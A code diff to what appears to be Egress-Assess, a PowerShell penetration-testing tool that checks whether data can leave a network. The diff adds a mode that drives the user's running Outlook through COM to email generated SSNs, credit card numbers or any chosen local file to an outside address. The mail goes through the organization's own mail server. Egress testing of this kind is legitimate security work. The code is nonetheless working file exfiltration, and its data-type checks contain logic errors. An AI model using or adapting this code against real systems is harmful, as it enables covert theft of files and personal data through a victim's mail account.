@@ -145,6 +145,10 @@ function Invoke-EgressAssess
                     Write-Verbose "[*] ICMP server *possibly* running."
                     Return
                 }
+                elseif ($client -eq "smtpoutlook")
+                {
+                    Write-Verbose "[*] Attempting to use Organization's Mail Server, so ensure MX record for Egress-Assess server is set"
+                }  
                 elseif ($client -eq "dnstxt" -or $client -eq "dnsresolved")
                 {
                     <#Note: Need to troubleshoot DNS checks more.
@@ -192,7 +196,7 @@ function Invoke-EgressAssess
                         {
                             $port = 22
                         }
-                        elseif ($client -eq "smtp")
+                        elseif ($client -eq "smtp" )
                         {
                             $port = 25
                         }
@@ -1681,7 +1685,124 @@ function Invoke-EgressAssess
             
         }
         
-        function Use-SMTP
+        function Use-SMTPOutlook
+        {
+            if ($Datatype -contains "ssn" -or "cc" -or "identity")
+            {
+                if ($Datatype -eq "ssn")
+                {
+                    Generate-SSN
+                    $SMTPData = $AllSSN
+                }
+                elseif ($Datatype -eq "ni")
+                {
+                    Generate-NI
+                    $SMTPData = $AllNI
+                }
+                elseif ($Datatype -eq "cc")
+                {
+                    Generate-CreditCards
+                    $SMTPData = $AllCC
+                }
+                elseif ($Datatype -eq "identity")
+                {
+                    Generate-Identity
+                    $SMTPData = $AllNames
+                }
+                
+                elseif ($Datatype -notcontains "ssn" -or "cc" -or "identity")
+                {
+                    if (!(Test-Path -Path $Datatype)) { Throw "File doesnt exist" }
+                    $filetransfer = $True
+                    $SourceFilePath = Get-ChildItem $Datatype | % { $_.FullName }
+                }
+            }
+            else
+            {
+                Write-Verbose "[*] You did not provide a data type to generate."
+            }
+
+            $check_outlook = get-process -name outlook -ea silentlycontinue
+            if ($check_outlook) {
+		        $outlook_running = $true
+            }
+            else 
+            {
+                Write-Verbose "[*] Outlook is not running, Outlook will be started and may require user authentication to create session" 
+            	$outlook_running = $false
+	        }
+            
+            if ($IP -as [ipaddress] -as [bool] )
+            {
+               Write-Verbose "[*] -IP needs to be set as the Domain used to email to, not an actual IP address"
+               return
+            }
+           do
+            {
+                # https://community.spiceworks.com/how_to/150253-send-mail-from-powershell-using-outlook
+		Try
+                {
+                    #create COM object named Outlook 
+                    $Outlook = New-Object -ComObject Outlook.Application 
+                    #create Outlook MailItem named Mail using CreateItem() method 
+                    $Mail = $Outlook.CreateItem(0) 
+                    
+                    if (!$SMTP_To)
+                    {
+                        $Mail.To = "egress-assess@$IP"
+                    }
+                    else
+                    {
+                        $Mail.To = $SMTP_TO
+                    }
+                    #if (!$SMTP_From)
+                    #{
+                    #    $Mail.From = "tester@egress-assess.com"
+                    #}
+                    
+                    if (!$SMTP_Subject)
+                    {
+                        $Mail.Subject = "Egress-Assess Exfil Data vis SMTPOutlook"
+                    }
+                    else
+                    {
+                        $Mail.Subject = $SMTP_Subject
+                    }
+                    
+                    if ($filetransfer -eq $true)
+                    {
+                        $Mail.Body = "EgressAssess With Attachment"
+                        $Mail.Attachments.Add($SourceFilePath)
+                        $mail.send() 
+                    }
+                    else
+                    {
+                        $Mail.Body = "$SMTPData"
+                        $Mail.send()
+                    }
+
+                }
+                catch
+                {
+                    $ErrorMessage = $_.Exception.Message
+                    Write-Verbose "[*] Error, tranfer failed with error:"
+                    Write-Verbose $ErrorMessage
+                    Break
+                }
+                Write-Verbose "[*] Transfer complete!"
+                $loops--
+                Write-Verbose "[*] $loops loops remaining.."
+            }
+            While ($loops -gt 0)
+
+	        #If outlook wasn't previousl running close out and clean up.
+	        if ( !$outlook_running ){
+                $Outlook.Quit() 
+	            [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Outlook) | Out-Null
+            }
+        }
+
+         function Use-SMTP
         {
             if ($Datatype -contains "ssn" -or "cc" -or "identity")
             {
@@ -2358,6 +2479,10 @@ function Invoke-EgressAssess
         elseif ($client -eq "ftp")
         {
             Use-Ftp
+        }
+        elseif ($client -eq "smtpoutlook")
+        {
+            Use-SMTPOutlook
         }
         elseif ($client -eq "smtp")
         {
